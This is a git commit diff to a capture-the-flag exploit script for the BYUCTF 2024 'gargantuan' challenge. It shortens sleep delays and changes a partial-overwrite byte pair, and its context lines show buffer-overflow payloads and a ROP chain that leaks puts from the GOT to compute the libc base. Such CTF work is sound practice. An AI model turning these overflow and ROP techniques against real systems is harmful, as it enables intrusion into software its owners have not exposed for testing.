62e32d5f27c9693737d7002b747f24a437172ed9
Sky-Lance <ammaramanand@gmail.com>
2024-05-23 19:41:07 +0530

    making some changes to structure

--- ctf/2024/BYUCTF24/gargantuan/exp.py
+++ ctf/2024/BYUCTF24/gargantuan/exp.py
@@ -48,15 +48,15 @@ for i in range(4):
     payload += b'\x00'
     payload += b'a'*255
     s(payload)
-    sleep(0.5)
+    sleep(0.1)
 
 
 payload = b'a'*255
 payload += b'\x00'
 payload += b'a'*(50-6)
-payload += b'\xe6\x51'
+payload += b'\xe6\xe1'
 s(payload)
-sleep(0.5)
+sleep(0.1)
 
 # s(b'a'*257)
 
@@ -69,7 +69,7 @@ for i in range(4):
     payload += b'\x00'
     payload += b'a'*255
     s(payload)
-    sleep(0.5)
+    sleep(0.1)
 
 pop_rdi = elf.address + 0x00000000000011e0
 payload = b'a'*255
@@ -80,7 +80,7 @@ payload += p64(elf.got['puts'])
 payload += p64(elf.plt['puts'])
 payload += p64(elf.symbols['main'])
 s(payload)
-sleep(0.5)
+sleep(0.1)
 
 rl()
 libc.address = u64(rl().strip().ljust(8, b'\x00')) - 0x80e50
@@ -93,7 +93,7 @@ for i in range(4):
     payload += b'\x00'
     payload += b'a'*255
     s(payload)
-    sleep(0.5)
+    sleep(0.1)
 
 payload = b'a'*255
 payload += b'\x00'
